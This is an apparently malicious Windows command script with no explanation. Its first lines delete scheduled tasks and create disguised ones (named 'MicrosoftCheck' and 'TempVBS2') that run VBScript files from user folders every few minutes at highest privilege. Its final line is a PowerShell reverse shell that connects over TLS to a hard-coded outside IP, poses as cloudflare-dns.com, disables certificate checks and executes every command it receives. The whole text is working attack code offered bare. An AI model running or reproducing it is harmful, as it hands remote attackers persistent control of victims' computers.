schtasks /delete /tn "auto_by_task" /f
schtasks /delete /tn "InstallRequests" /f
schtasks /delete /tn "RunPowerShellScript" /f
schtasks /create /tn "MicrosoftCheck" /sc minute /mo 6 /tr "wscript.exe \"%APPDATA%\microsoftcheck.vbs\"" /rl HIGHEST /f
schtasks /delete /tn "TempVBS" /f
schtasks /create /tn "TempVBS2" /sc minute /mo 5 /tr "\"%SystemRoot%\System32\wscript.exe\" //e:vbscript //b \"%TEMP%\ddd.vbs\"" /rl HIGHEST /f






powershell -Command "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('185.194.175.132', 447); $NetworkStream = $TCPClient.GetStream(); $SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback])); $SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false); if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close(); exit}; $StreamWriter = New-Object IO.StreamWriter($SslStream); function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096; $StreamWriter.Write($String + 'SHELL> '); $StreamWriter.Flush()}; WriteToStream ''; while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); $Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}; WriteToStream ($Output)} $StreamWriter.Close()"
